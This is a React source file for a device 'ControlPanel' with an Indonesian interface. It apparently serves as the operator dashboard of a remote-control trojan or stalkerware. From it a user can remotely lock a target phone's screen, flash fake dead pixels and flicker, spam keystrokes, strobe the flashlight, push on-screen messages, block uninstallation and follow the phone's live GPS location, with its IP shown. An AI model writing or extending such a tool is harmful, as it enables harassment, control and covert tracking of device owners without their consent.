"use client";
import { useState } from "react";
import { motion } from "framer-motion";

type Device = {
  id: string;
  name: string;
  model: string;
  online: boolean;
  lastSeen: string;
  battery: number;
  ip: string;
};

export default function ControlPanel({ device, onBack }: { device: Device; onBack: () => void }) {
  const [active, setActive] = useState<Record<string, boolean>>({});
  const [message, setMessage] = useState("");
  const [flashSpeed, setFlashSpeed] = useState(5);
  const [lineColor, setLineColor] = useState<"green" | "pink">("green");
  const [sending, setSending] = useState(false);
  const [lastResult, setLastResult] = useState("");

  async function sendCommand(type: string, payload: any = {}) {
    setSending(true);
    setLastResult("");
    try {
      const res = await fetch("/api/commands", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ deviceId: device.id, type, payload }),
      });
      const data = await res.json();
      if (data.ok) {
        setLastResult(`✓ ${type} terkirim`);
        return true;
      }
      setLastResult("✗ Gagal kirim");
      return false;
    } catch {
      setLastResult("✗ Error jaringan");
      return false;
    } finally {
      setSending(false);
      setTimeout(() => setLastResult(""), 3000);
    }
  }

  async function toggle(id: string, extra: any = {}) {
    if (sending) return;
    const next = !active[id];
    const ok = await sendCommand(id, { enabled: next, ...extra });
    if (ok) setActive((p) => ({ ...p, [id]: next }));
  }

  async function sendMessage() {
    if (!message.trim() || sending) return;
    const ok = await sendCommand("message", { text: message.trim() });
    if (ok) setMessage("");
  }

  const features = [
    { id: "lock", label: "Lock", desc: "Kunci layar" },
    { id: "line", label: "Lightsaber", desc: "Garis neon", extra: "line" },
    { id: "deadpixel", label: "Dead Pixel", desc: "Warna berganti" },
    { id: "flicker", label: "Flicker", desc: "Layar kedip" },
    { id: "spamkey", label: "Spam Key", desc: "Spam input" },
    { id: "flashlight", label: "Senter", desc: "Flash kedip", extra: "flash" },
    { id: "antiuninstall", label: "Anti Uninstall", desc: "Cegah uninstall" },
    { id: "gps", label: "GPS", desc: "Lokasi live" },
  ];

  return (
    <div className="space-y-4 pb-4">
      <button onClick={onBack} className="text-sm text-mint font-bold">← Kembali</button>

      {/* Device info 16:9 style */}
      <div className="card p-4">
        <div className="flex items-center gap-3 mb-3">
          <div className={`w-3 h-3 rounded-full ${device.online ? "bg-mint pulse-dot" : "bg-gray-300"}`} />
          <div>
            <div className="font-black">{device.name}</div>
            <div className="text-xs text-muted">{device.model} · {device.ip}</div>
          </div>
        </div>
        <div className="grid grid-cols-2 gap-2 text-xs">
          <div className="bg-cream rounded-lg p-2 border border-gold/20">
            <div className="text-muted">Baterai</div>
            <div className="font-bold">{device.battery}%</div>
          </div>
          <div className="bg-cream rounded-lg p-2 border border-gold/20">
            <div className="text-muted">Status</div>
            <div className="font-bold">{device.online ? "Online" : device.lastSeen}</div>
          </div>
        </div>
      </div>

      {lastResult && (
        <motion.div initial={{ opacity: 0, y: -6 }} animate={{ opacity: 1, y: 0 }} className="text-center text-sm font-bold text-mint bg-mint-soft py-2 rounded-xl border border-mint/30">
          {lastResult}
        </motion.div>
      )}

      {/* Message */}
      <div className="card p-4 space-y-3">
        <div>
          <div className="font-bold text-sm">Kirim Pesan</div>
          <div className="text-xs text-muted">Muncul tengah layar 15 detik</div>
        </div>
        <input
          value={message}
          onChange={(e) => setMessage(e.target.value)}
          placeholder="Tulis pesan..."
          className="w-full bg-cream border border-gold/30 rounded-xl px-3 py-2 text-sm outline-none focus:border-gold"
        />
        <button
          disabled={sending || !message.trim()}
          onClick={sendMessage}
          className="w-full py-2.5 rounded-full font-bold text-sm bg-gold text-ink border-2 border-ink disabled:opacity-40"
        >
          Kirim Pesan
        </button>
      </div>

      {/* Features 2-column */}
      <div className="grid grid-cols-2 gap-3">
        {features.map((f) => (
          <div key={f.id} className="card p-3 space-y-2">
            <div className="min-h-[40px]">
              <div className="font-bold text-sm">{f.label}</div>
              <div className="text-[10px] text-muted leading-tight">{f.desc}</div>
            </div>

            {f.extra === "line" && (
              <div className="flex gap-1">
                <button onClick={() => setLineColor("green")} className={`flex-1 py-1 rounded-lg text-[10px] font-bold border ${lineColor === "green" ? "bg-green-400 border-ink" : "bg-cream border-gold/30"}`}>Hijau</button>
                <button onClick={() => setLineColor("pink")} className={`flex-1 py-1 rounded-lg text-[10px] font-bold border ${lineColor === "pink" ? "bg-pink-400 border-ink" : "bg-cream border-gold/30"}`}>Pink</button>
              </div>
            )}

            {f.extra === "flash" && (
              <div>
                <div className="text-[10px] text-muted mb-0.5">Speed: {flashSpeed}</div>
                <input type="range" min={1} max={15} value={flashSpeed} onChange={(e) => setFlashSpeed(Number(e.target.value))} className="w-full" />
              </div>
            )}

            <button
              disabled={sending}
              onClick={() => {
                if (f.id === "line") toggle("line", { color: lineColor });
                else if (f.id === "flashlight") toggle("flashlight", { speed: flashSpeed });
                else toggle(f.id);
              }}
              className={`w-full py-2 rounded-full text-xs font-black border-2 border-ink transition ${
                active[f.id] ? "bg-mint text-white" : "bg-cream text-ink"
              }`}
            >
              {active[f.id] ? "ON" : "OFF"}
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}
